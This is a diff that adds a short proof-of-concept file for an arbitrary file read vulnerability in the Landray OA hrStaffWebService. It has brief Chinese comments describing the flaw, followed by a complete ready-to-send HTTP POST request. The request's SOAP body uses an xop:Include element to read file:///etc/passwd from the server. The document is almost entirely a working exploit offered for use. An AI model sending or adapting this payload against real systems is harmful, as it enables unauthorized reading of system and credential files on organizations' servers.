@@ -1,0 +1,28 @@
+# 蓝凌OA hrStaffWebService任意文件读取漏洞
+# 蓝凌OA系统是一套企业级办公自动化软件解决方案，提供了一系列功能模块,帮助企业实现高效的办公管理和协同工作。
+# 蓝凌OA hrStaffWebService存在任意文件读取漏洞。攻击者可利用该漏洞获取服务器敏感信息。
+POST /sys/webservice/hrStaffWebService?acid=80052396&bid=hd_tag_m8mv2500 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2500
+RM-PRO-Token: eb0dfa68461622ef59008616e7923fa0
+RM-PRO-Time: 1742808426967
+User-Agent: curl/7.83.1
+Content-Type: multipart/related; boundary=----frhpvivnctknnkiwugaq
+
+------frhpvivnctknnkiwugaq
+Content-Disposition: form-data; name="1"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
+<soapenv:Header/>
+<soapenv:Body>
+    <web:getHrStaffElements>
+        <arg0>
+            <beginTimeStamp>1</beginTimeStamp>
+            <count><xop:Include 
+xmlns:xop="http://www.w3.org/2004/08/xop/include" 
+href="file:///etc/passwd"/></count>
+        </arg0>
+    </web:getHrStaffElements>
+</soapenv:Body>
+</soapenv:Envelope>
+------frhpvivnctknnkiwugaq--
